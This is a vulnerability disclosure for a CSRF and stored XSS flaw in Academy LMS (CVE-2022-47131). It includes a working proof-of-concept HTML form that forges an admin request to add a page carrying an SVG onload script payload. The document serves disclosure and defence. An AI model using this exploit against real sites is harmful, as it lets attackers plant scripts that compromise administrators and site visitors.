# CVE-2022-47131
Academy LMS &lt;= 5.10 CSRF / XSS

# Description
Academy LMS is an application where people can create and advertise courses. The feature of adding a new page is vulnerable to CSRF as there is no token which causes this attack to be avoided. Additionally, this page may be used to load an XSS payload stored.

# Proof of Concept (POC)
The first step to our proof of concept is to authenticate to the platform with administrative user.

After that, just access the page that contains the code for exploiting the vulnerability, see that A new button will be added to the website's home page, redirecting to xss page.

Code used in the exploit:

```html
<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="https://target.com/admin/custom_page/add" method="POST">
       <input type="hidden" name="page&#95;title" value="CSRF&#32;XSS" />
       <input type="hidden" name="page&#95;content" value="&quot;&gt;&lt;svg&#32;onload&#61;alert&#40;document&#46;domain&#41;&#59;&gt ;" />
       <input type="hidden" name="files" value="" />
       <input type="hidden" name="button&#95;title" value="CSRF&#32;XSS" />
       <input type="hidden" name="button&#95;position" value="header" />
       <input type="hidden" name="page&#95;url" value="xss" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>
```
